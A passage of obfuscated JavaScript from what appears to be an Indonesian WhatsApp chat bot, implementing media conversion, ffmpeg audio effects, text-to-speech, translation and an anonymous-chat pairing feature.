            if (!/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Balas sticker dengan caption *' + (_0x3b7c58 + _0x453fc1) + '*');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x18dafb = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x2ef535 = await getRandom(_0x5804c8(0x4ce));
            exec(_0x5804c8(0x22e) + _0x18dafb + ' ' + _0x2ef535, _0x342bc6 => {
                const _0x4ff4e8 = _0x5804c8;
                fs['unlinkSync'](_0x18dafb);
                if (_0x342bc6) throw _0x342bc6;
                let _0x38271d = fs[_0x4ff4e8(0x456)](_0x2ef535);
                _0x614da8[_0x4ff4e8(0x938)](_0x1b1e88[_0x4ff4e8(0x60f)], {
                    'image': _0x38271d
                }, {
                    'quoted': _0x1b1e88
                }), fs[_0x4ff4e8(0x850)](_0x2ef535);
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x288):
        case _0x5804c8(0x3bb): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0x6a4)]) throw _0x5804c8(0x585);
            if (_0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0x541)] !== _0x5804c8(0x740)) throw _0x5804c8(0x2b6);
            let _0x11a74b = _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0x200)],
                _0x36efcd = Object[_0x5804c8(0xafa)](_0x11a74b)[0x0],
                _0x11a901 = await downloadContentFromMessage(_0x11a74b[_0x36efcd], _0x36efcd == 'imageMessage' ? 'image' : _0x5804c8(0x7f5)),
                _0x3356a8 = Buffer[_0x5804c8(0x44e)]([]);
            for await (const _0x37c8c5 of _0x11a901) {
                _0x3356a8 = Buffer[_0x5804c8(0x530)]([_0x3356a8, _0x37c8c5]);
            }
            if (/video/ [_0x5804c8(0xbaa)](_0x36efcd)) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88['chat'], _0x3356a8, _0x5804c8(0x851), _0x11a74b[_0x36efcd]['caption'] || '', _0x1b1e88);
            else {
                if (/image/ [_0x5804c8(0xbaa)](_0x36efcd)) return _0x614da8['sendFile'](_0x1b1e88[_0x5804c8(0x60f)], _0x3356a8, 'media.jpg', _0x11a74b[_0x36efcd][_0x5804c8(0xb63)] || '', _0x1b1e88);
            }
        }
        break;
        case _0x5804c8(0xa94):
        case _0x5804c8(0x515):
        case _0x5804c8(0x673):
        case _0x5804c8(0x620):
        case 'fast':
        case _0x5804c8(0x5ef):
        case 'nightcore':
        case _0x5804c8(0xc47):
        case 'robot':
        case _0x5804c8(0x551):
        case _0x5804c8(0x466):
        case _0x5804c8(0x137):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            try {
                let _0x1d0312;
                if (/bass/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0xb11);
                if (/blown/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x3da);
                if (/deep/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x666);
                if (/earrape/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x260);
                if (/fast/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x261);
                if (/fat/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x13e);
                if (/nightcore/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = '-filter:a atempo=1.06,asetrate=44100*1.25';
                if (/reverse/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0x36c);
                if (/robot/ ['test'](_0x453fc1)) _0x1d0312 = _0x5804c8(0x3f4);
                if (/slow/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = _0x5804c8(0xc6b);
                if (/smooth/ ['test'](_0x453fc1)) _0x1d0312 = _0x5804c8(0xb49);
                if (/tupai/ [_0x5804c8(0xbaa)](_0x453fc1)) _0x1d0312 = '-filter:a \"atempo=0.5,asetrate=65100\"';
                if (/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                    _0x1b1e88[_0x5804c8(0x322)](mess[_0x5804c8(0x135)]);
                    let _0x480dcd = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a),
                        _0x14621f = getRandom(_0x5804c8(0x7eb));
                    exec(_0x5804c8(0x22e) + _0x480dcd + ' ' + _0x1d0312 + ' ' + _0x14621f, (_0x12314a, _0x3a76a2, _0x1729d3) => {
                        const _0x206fa9 = _0x5804c8;
                        fs[_0x206fa9(0x850)](_0x480dcd);
                        if (_0x12314a) return _0x1b1e88[_0x206fa9(0x322)](_0x12314a);
                        let _0x11b3e1 = fs[_0x206fa9(0x456)](_0x14621f);
                        _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                            'audio': _0x11b3e1,
                            'mimetype': 'audio/mpeg'
                        }, {
                            'quoted': _0x1b1e88
                        }), fs[_0x206fa9(0x850)](_0x14621f);
                    });
                } else _0x358f3b(_0x5804c8(0x522) + (_0x3b7c58 + _0x453fc1) + '*');
            } catch (_0x229868) {
                _0x358f3b(_0x229868);
            }
            break;
        case _0x5804c8(0xb59): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                toPTT: _0x54b85b
            } = require(_0x5804c8(0xa44)), {
                MessageType: _0x12b02b
            } = require(_0x5804c8(0xb21));
            let _0x132595 = _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)] : _0x1b1e88;
            if (!/video|audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) throw _0x5804c8(0x891) + (_0x3b7c58 + _0x453fc1) + '*';
            let _0xbdaefa = await _0x132595[_0x5804c8(0x4dd)](),
                _0x101149 = {
                    'ptvMessage': _0x1b1e88[_0x5804c8(0x200)][_0x5804c8(0xd00)][_0x5804c8(0x3dd)][_0x5804c8(0xd08)][_0x5804c8(0xa62)]
                };
            _0x614da8[_0x5804c8(0xbaf)](_0x1b1e88[_0x5804c8(0x60f)], _0x101149, {});
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xa65): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed(_0x5804c8(0xad0), _0x1b1e88['sender'], _cmd);
            if (!/video/ [_0x5804c8(0xbaa)](_0x2b1d7d) && !/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xac8) + (_0x3b7c58 + _0x453fc1));
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0xac8) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess['wait']);
            let _0x431aa9 = await _0x8a4e1a[_0x5804c8(0x4dd)](),
                {
                    toAudio: _0x5f1a3b
                } = require(_0x5804c8(0xa44)),
                _0x4434ec = await _0x5f1a3b(_0x431aa9, _0x5804c8(0x223));
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': _0x4434ec,
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xc20):
        case _0x5804c8(0x75e): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed(_0x5804c8(0x9c0), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            if (!/video/ [_0x5804c8(0xbaa)](_0x2b1d7d) && !/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xac8) + (_0x3b7c58 + _0x453fc1));
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0xac8) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess['wait']);
            let _0x1d1c46 = await _0x8a4e1a['download'](),
                {
                    toAudio: _0xd0694c
                } = require(_0x5804c8(0xa44)),
                _0xcf67e3 = await _0xd0694c(_0x1d1c46, _0x5804c8(0x223));
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': _0xcf67e3,
                'mimetype': 'audio/mpeg'
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x2f0):
        case 'attp': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed('#attp', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            if (!_0x1b04cf) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + ' halo');
            if (_0x1b04cf[_0x5804c8(0x977)] > 0x14) return _0x358f3b(_0x5804c8(0x47a));
            _0x358f3b(mess['wait']), await _0x614da8[_0x5804c8(0x2bf)](_0x1b1e88[_0x5804c8(0x60f)], 'https://api.zeeoneofc.my.id/api/canvas/' + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)], _0x1b1e88, {
                'packname': _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()),
                'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + '\x0aTime ' + _0x4fb4a6
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'emojimix': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            _0x1c7aed('#emojimix', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let [_0x367a32, _0x3b9e98] = _0x1b04cf['split']
            `+`;
            if (!_0x367a32) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + ' 😅+💩');
            if (!_0x3b9e98) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x99f));
            let _0x5a0d2f = await fetchJson(_0x5804c8(0x164) + encodeURIComponent(_0x367a32) + '_' + encodeURIComponent(_0x3b9e98));
            for (let _0x454236 of _0x5a0d2f[_0x5804c8(0x1fe)]) {
                let _0x2cbe08 = await _0x614da8[_0x5804c8(0x2bf)](_0x1b1e88['chat'], _0x454236['url'], _0x1b1e88, {
                    'packname': _0x5804c8(0x88c) + _0x932571['botName'] + '\x0a' + tanggal(new Date()),
                    'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + _0x5804c8(0x253) + _0x4fb4a6,
                    'categories': _0x454236[_0x5804c8(0xc60)]
                });
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x96e):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#nulis', _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0x534) + _0x3b7c58 + _0x5804c8(0x86d) + _0x3b7c58 + 'nuliskanan\x0a3. ' + _0x3b7c58 + 'foliokiri\x0a4. ' + _0x3b7c58 + _0x5804c8(0x540) + _0x3b7c58 + _0x5804c8(0xd20));
            break;
        case _0x5804c8(0xd25): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' text\x0a\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc24));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x518949 = _0x3bcaa8[_0x5804c8(0x7af)](0xb);
            _0x1c7aed(_0x5804c8(0x131), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': 'https://api.zeeoneofc.my.id/api/canvas/' + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]
                },
                'caption': 'Nih kak'
            }, {
                'quoted': _0x1b1e88
            })['catch'](async _0x5b2dd3 => await _0x358f3b(_0x5804c8(0x69c))), limitAdd(_0x1b1e88['sender'], limit);
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x9c7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x338) + (_0x3b7c58 + _0x453fc1) + ' juna');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x1c8360 = _0x3bcaa8['slice'](0xc);
            _0x1c7aed(_0x5804c8(0x616), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x5804c8(0x6c4) + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]
                },
                'caption': _0x5804c8(0x96a)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](async _0xe4b1f => await _0x358f3b(_0x5804c8(0x69c))), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'foliokiri': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x338) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc24));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x26bf50 = _0x3bcaa8[_0x5804c8(0x7af)](0xb);
            _0x1c7aed(_0x5804c8(0x967), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': 'https://api.zeeoneofc.my.id/api/canvas/' + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]
                },
                'caption': _0x5804c8(0x96a)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](async _0x2f733a => await _0x358f3b(_0x5804c8(0x69c))), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x4ff): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' text\x0a\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + ' juna');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x2999b9 = _0x3bcaa8[_0x5804c8(0x7af)](0xc);
            _0x1c7aed(_0x5804c8(0xbe4), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5804c8(0x6c4) + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]
                },
                'caption': _0x5804c8(0x96a)
            }, {
                'quoted': _0x1b1e88
            })['catch'](async _0xc2b860 => await _0x358f3b(_0x5804c8(0x69c))), limitAdd(_0x1b1e88['sender'], limit);
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x979): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' text\x0a\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x403));
            await _0x614da8[_0x5804c8(0x593)]('recording', _0x1b1e88[_0x5804c8(0x60f)]);
            var _0x25768f = await fetchJson(_0x5804c8(0xcde) + _0x1b04cf + '&lang=mix&voice=paimon&speed=0.65&symbol=y&apikey=' + _0x932571[_0x5804c8(0x342)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': {
                    'url': _0x25768f['data'][_0x5804c8(0xbf3)]
                },
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x52b): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x338) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc24));
            _0x1c7aed(_0x5804c8(0x4cd), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x47b319 = _0x1b04cf[_0x5804c8(0x4bd)]('--')[0x1];
            if (!_0x47b319) _0x47b319 = 'id';
            long = 'id';

            function _0x5ac621(_0x40f324, _0xf4953d = 'id') {
                return new Promise((_0xd14ce0, _0x527f18) => {
                    const _0x35e800 = _0x2dbd;
                    try {
                        let _0x52774a = gtts(_0xf4953d),
                            _0x3a99ff = path['join'](__dirname, _0x35e800(0x5e7), 0x1 * new Date() + _0x35e800(0xd23));
                        _0x52774a['save'](_0x3a99ff, _0x40f324, () => {
                            const _0x55af2d = _0x35e800;
                            _0xd14ce0(fs[_0x55af2d(0x456)](_0x3a99ff)), fs[_0x55af2d(0x850)](_0x3a99ff);
                        });
                    } catch (_0x206d78) {
                        _0x527f18(_0x206d78);
                    }
                });
            }
            let _0x323623;
            try {
                _0x323623 = await _0x5ac621(_0x1b04cf, long);
            } catch (_0x57af70) {
                _0x358f3b(_0x57af70 + ''), _0x323623 = await _0x5ac621(_0x1b04cf);
            } finally {
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'audio': _0x323623,
                    'mimetype': _0x5804c8(0x8d4),
                    'ptt': !![]
                }, {});
            }
            limitAdd(_0x1b1e88['sender'], limit);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x681):
        case 'tr': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x536) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x54c) + (_0x3b7c58 + _0x453fc1) + ' id halo\x0a2. Reply chat dengan caption ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x684) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x726));
            let _0x280d80 = _0x1b1e88['quoted'] ? _0x8a4e1a[_0x5804c8(0x73c)] : _0x8a4e1a[_0x5804c8(0x73c)]['split'](_0x83eae5[0x0])[0x1];
            translate(_0x280d80, {
                'to': _0x83eae5[0x0]
            })[_0x5804c8(0xabe)](_0x156ec3 => {
                const _0x41fea8 = _0x5804c8;
                _0x614da8[_0x41fea8(0x4aa)](_0x1b1e88['chat'], '' + _0x156ec3[_0x41fea8(0x73c)], _0x1b1e88);
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'anonymouschat': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0xb3b));
            _0x358f3b(_0x5804c8(0x833) + _0x32b235 + _0x5804c8(0xd7e) + _0x3b7c58 + _0x5804c8(0x390));
        }
        break;
        case _0x5804c8(0x252):
        case 'leave': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0xb3b));
            this[_0x5804c8(0xa31)] = this['anonymous'] ? this['anonymous'] : {};
            let _0x5cab30 = Object['values'](this[_0x5804c8(0xa31)])['find'](_0x56e214 => _0x56e214[_0x5804c8(0xa56)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!_0x5cab30) {
                _0x358f3b(_0x5804c8(0x957) + _0x3b7c58 + _0x5804c8(0x390));
                throw ![];
            }
            _0x358f3b(_0x5804c8(0xa79));
            let _0x4f9fcb = _0x5cab30[_0x5804c8(0x941)](_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x4f9fcb) await _0x614da8[_0x5804c8(0x4aa)](_0x4f9fcb, 'Partner Telah Meninggalkan Sesi Anonymous', _0x1b1e88);
            delete this[_0x5804c8(0xa31)][_0x5cab30['id']];
            if (_0x453fc1 === _0x5804c8(0x3b6)) break;
        }
        break;
        case _0x5804c8(0x519):
        case _0x5804c8(0xa80): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0xb3b));
            this['anonymous'] = this['anonymous'] ? this[_0x5804c8(0xa31)] : {};
            if (Object[_0x5804c8(0x960)](this[_0x5804c8(0xa31)])[_0x5804c8(0x958)](_0x521477 => _0x521477[_0x5804c8(0xa56)](_0x1b1e88['sender']))) {
                _0x358f3b(_0x5804c8(0x4d7) + _0x3b7c58 + _0x5804c8(0x1ff));
                throw ![];
            }
            let _0x41fe78 = Object['values'](this[_0x5804c8(0xa31)])['find'](_0x83d229 => _0x83d229[_0x5804c8(0xcdc)] === _0x5804c8(0x1b3) && !_0x83d229[_0x5804c8(0xa56)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (_0x41fe78) _0x614da8[_0x5804c8(0x938)](_0x41fe78['a'], {
                'text': _0x5804c8(0x709) + _0x3b7c58 + _0x5804c8(0x538) + _0x3b7c58 + _0x5804c8(0x23b)
            }), _0x41fe78['b'] = _0x1b1e88[_0x5804c8(0xd13)], _0x41fe78[_0x5804c8(0xcdc)] = _0x5804c8(0x531), _0x358f3b(_0x5804c8(0x709) + _0x3b7c58 + _0x5804c8(0x538) + _0x3b7c58 + 'stop -- _menghentikan sesi chat_');
            else {
                let _0x44bf66 = +new Date();
                this['anonymous'][_0x44bf66] = {
                    'id': _0x44bf66,
                    'a': _0x1b1e88[_0x5804c8(0xd13)],
                    'b': '',
                    'state': _0x5804c8(0x1b3),
                    'check': function (_0x3b4927 = '') {
                        return [this['a'], this['b']]['includes'](_0x3b4927);
                    },
                    'other': function (_0x3f099b = '') {
                        return _0x3f099b === this['a'] ? this['b'] : _0x3f099b === this['b'] ? this['a'] : '';
                    }
                }, _0x358f3b(_0x5804c8(0xcff));
            }
            break;
        }
        case _0x5804c8(0xb83):
        case _0x5804c8(0xd53): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0xb3b));
            this[_0x5804c8(0xa31)] = this[_0x5804c8(0xa31)] ? this[_0x5804c8(0xa31)] : {};
            let _0x2b1945 = Object[_0x5804c8(0x960)](this[_0x5804c8(0xa31)])[_0x5804c8(0x958)](_0xa043dc => _0xa043dc['check'](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!_0x2b1945) {
                _0x358f3b(_0x5804c8(0x957) + _0x3b7c58 + _0x5804c8(0x390));
                throw ![];
            }
            let _0x4fcbce = _0x2b1945[_0x5804c8(0x941)](_0x1b1e88[_0x5804c8(0xd13)]);
            if (_0x4fcbce) await _0x614da8['sendText'](_0x4fcbce, _0x5804c8(0xd28), _0x1b1e88);
            delete this['anonymous'][_0x2b1945['id']];
            let _0x3c3ebd = Object[_0x5804c8(0x960)](this[_0x5804c8(0xa31)])[_0x5804c8(0x958)](_0x48d3af => _0x48d3af[_0x5804c8(0xcdc)] === _0x5804c8(0x1b3) && !_0x48d3af[_0x5804c8(0xa56)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (_0x3c3ebd) _0x614da8[_0x5804c8(0x938)](_0x3c3ebd['a'], {
                'text': _0x5804c8(0x709) + _0x3b7c58 + 'skip -- _mencari partner lain_\x0a' + _0x3b7c58 + _0x5804c8(0x23b)
            }), _0x3c3ebd['b'] = _0x1b1e88[_0x5804c8(0xd13)], _0x3c3ebd[_0x5804c8(0xcdc)] = 'CHATTING', _0x358f3b(_0x5804c8(0x709) + _0x3b7c58 + 'skip -- _mencari partner lain_\x0a' + _0x3b7c58 + _0x5804c8(0x23b));
            else {
                let _0x54eea8 = +new Date();
                this[_0x5804c8(0xa31)][_0x54eea8] = {
                    'id': _0x54eea8,
                    'a': _0x1b1e88[_0x5804c8(0xd13)],
                    'b': '',
                    'state': _0x5804c8(0x1b3),
                    'check': function (_0x58d569 = '') {
                        const _0x3651fd = _0x5804c8;
                        return [this['a'], this['b']][_0x3651fd(0x34b)](_0x58d569);
                    },
                    'other': function (_0x472776 = '') {
                        return _0x472776 === this['a'] ? this['b'] : _0x472776 === this['b'] ? this['a'] : '';
                    }
                }, _0x358f3b(_0x5804c8(0xcff));
            }
            break;
        }
        case _0x5804c8(0x463):
        case 'sendprofil':
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0xb3b));
            this[_0x5804c8(0xa31)] = this[_0x5804c8(0xa31)] ? this[_0x5804c8(0xa31)] : {};
            let _0x39199f = Object['values'](this[_0x5804c8(0xa31)])[_0x5804c8(0x958)](_0xd13745 => _0xd13745[_0x5804c8(0xa56)](_0x1b1e88[_0x5804c8(0xd13)]));
            if (!_0x39199f) {
                _0x358f3b(_0x5804c8(0x552) + _0x3b7c58 + _0x5804c8(0x2f6));
                throw ![];
            } else {
                let _0x10a1d2 = Object[_0x5804c8(0x960)](this[_0x5804c8(0xa31)])[_0x5804c8(0x958)](_0x21dcaf => [_0x21dcaf['a'], _0x21dcaf['b']][_0x5804c8(0x34b)](_0x1b1e88[_0x5804c8(0xd13)]) && _0x21dcaf['state'] == 'CHATTING');
                var _0x5055e4 = _0x10a1d2['other'](_0x1b1e88[_0x5804c8(0xd13)]),
                    _0x1d6b41 = await _0x614da8[_0x5804c8(0xcb0)](_0x5055e4, [_0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0]]);
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'text': '✅ Berhasil mengirim profil ke teman chat anda!'
                }, {
                    'quoted': _0x1b1e88
                }), _0x614da8[_0x5804c8(0x938)](_0x5055e4, {
                    'text': _0x5804c8(0x806)
                }, {
                    'quoted': _0x1d6b41
                });
            }
            break;
        case _0x5804c8(0x35f):
        case 'store': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (db_respon_list[_0x5804c8(0x977)] === 0x0) return _0x358f3b(_0x5804c8(0x661));
            if (!isAlreadyResponListGroup(_0x1b1e88[_0x5804c8(0x60f)], db_respon_list)) return _0x358f3b(_0x5804c8(0x779));
            let _0x5297fb = 'Halo @' + _0x1b1e88['sender']['split']('@')[0x0] + ' berikut beberapa list yang tersedia saat ini.\x0a\x0a';
